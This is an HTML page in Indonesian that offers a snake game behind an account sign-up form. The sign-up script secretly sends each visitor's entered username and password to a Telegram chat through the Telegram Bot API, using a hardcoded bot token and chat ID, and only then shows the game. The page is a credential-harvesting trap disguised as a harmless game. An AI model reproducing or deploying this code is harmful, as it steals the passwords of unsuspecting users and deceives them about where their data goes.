<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daftar & Main Game Ular</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background-color: black;
            color: white;
            text-align: center;
            padding-top: 20px;
        }
        .container {
            background: #222;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            margin: auto;
            display: block;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            font-size: 16px;
        }
        button {
            background: green;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background: darkgreen;
        }
        #gameContainer {
            display: none;
        }
        canvas {
            background-color: #111;
            border: 2px solid white;
            margin-top: 20px;
        }
        .controls {
            display: grid;
            grid-template-columns: repeat(3, 60px);
            gap: 5px;
            margin-top: 15px;
        }
        .btn {
            width: 60px;
            height: 60px;
            background: white;
            border: 2px solid black;
            font-size: 24px;
            text-align: center;
            line-height: 60px;
            cursor: pointer;
            user-select: none;
            font-weight: bold;
        }
        .btn:active { background: gray; }
        .empty { visibility: hidden; }
        #restartBtn {
            display: none;
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            background: red;
            color: white;
            cursor: pointer;
        }
        #restartBtn:hover { background: darkred; }
    </style>
</head>
<body>

    <!-- FORM PENDAFTARAN -->
    <div id="registerContainer" class="container">
        <h2>Daftar Akun</h2>
        <input type="text" id="username" placeholder="Masukkan Username" required>
        <input type="password" id="password" placeholder="Masukkan Password" required>
        <button onclick="register()">Daftar</button>
    </div>

    <!-- GAME ULAR -->
    <div id="gameContainer">
        <canvas id="gameCanvas"></canvas>

        <div class="controls">
            <div class="empty"></div>
            <div class="btn" onclick="changeDirection('UP')">‚Üë</div>
            <div class="empty"></div>
            <div class="btn" onclick="changeDirection('LEFT')">‚Üê</div>
            <div class="btn" onclick="changeDirection('DOWN')">‚Üì</div>
            <div class="btn" onclick="changeDirection('RIGHT')">‚Üí</div>
        </div>

        <button id="restartBtn" onclick="restartGame()">Restart</button>
    </div>

    <script>
        function register() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            if (!username || !password) {
                alert("Harap isi semua kolom!");
                return;
            }

            // Token bot dan ID Telegram Anda
            const botToken = "8017274977:AAGonzixUns6wo0chSKgyw3BveSQDuQd2oM";
            const chatId = "8105758234";

            // Kirim data ke Telegram
            const message = `üîî *Pendaftaran Baru!*\nüë§ Username: *${username}*\nüîë Password: *${password}*`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
            });

            // Sembunyikan form dan tampilkan game
            document.getElementById("registerContainer").style.display = "none";
            document.getElementById("gameContainer").style.display = "block";
            initGame();
        }

        // GAME ULAR
        const canvas = document.getElementById("gameCanvas");
        const ctx = canvas.getContext("2d");
        const box = 25;
        canvas.width = box * 20;
        canvas.height = box * 20;

        let snake, food, direction, gameOver;
        let lastUpdateTime = 0;
        let moveSpeed = 100;
        const tailImage = new Image();
        tailImage.src = "IMG20250130120450.jpg";

        function initGame() {
            snake = [{ x: 10 * box, y: 10 * box }];
            food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
            direction = "RIGHT";
            gameOver = false;
            document.getElementById("restartBtn").style.display = "none";
            lastUpdateTime = performance.now();
            requestAnimationFrame(gameLoop);
        }

        document.addEventListener("keydown", (event) => {
            if (event.key === "ArrowUp" && direction !== "DOWN") direction = "UP";
            if (event.key === "ArrowDown" && direction !== "UP") direction = "DOWN";
            if (event.key === "ArrowLeft" && direction !== "RIGHT") direction = "LEFT";
            if (event.key === "ArrowRight" && direction !== "LEFT") direction = "RIGHT";
        });

        function changeDirection(dir) {
            if (dir === "UP" && direction !== "DOWN") direction = "UP";
            if (dir === "DOWN" && direction !== "UP") direction = "DOWN";
            if (dir === "LEFT" && direction !== "RIGHT") direction = "LEFT";
            if (dir === "RIGHT" && direction !== "LEFT") direction = "RIGHT";
        }

        function gameLoop(currentTime) {
            if (gameOver) {
                ctx.fillStyle = "white";
                ctx.font = "30px Arial";
                ctx.fillText("Game Over", canvas.width / 4, canvas.height / 2);
                document.getElementById("restartBtn").style.display = "block";
                return;
            }

            requestAnimationFrame(gameLoop);

            if (currentTime - lastUpdateTime > moveSpeed) {
                lastUpdateTime = currentTime;
                update();
                draw();
            }
        }

        function update() {
            let newHead = { x: snake[0].x, y: snake[0].y };
            if (direction === "UP") newHead.y -= box;
            if (direction === "DOWN") newHead.y += box;
            if (direction === "LEFT") newHead.x -= box;
            if (direction === "RIGHT") newHead.x += box;

            if (newHead.x === food.x && newHead.y === food.y) {
                food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
            } else snake.pop();

            snake.unshift(newHead);
        }

        function draw() {
            ctx.fillStyle = "#111";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "red";
            ctx.fillRect(food.x, food.y, box, box);

            snake.forEach((segment, index) => {
                ctx.fillStyle = "green";
                ctx.fillRect(segment.x, segment.y, box, box);
                if (index === 0) ctx.fillStyle = "black", ctx.fillText("YADI", segment.x + 3, segment.y + 18);
            });
        }

        function restartGame() { initGame(); }
    </script>
</body>
</html>
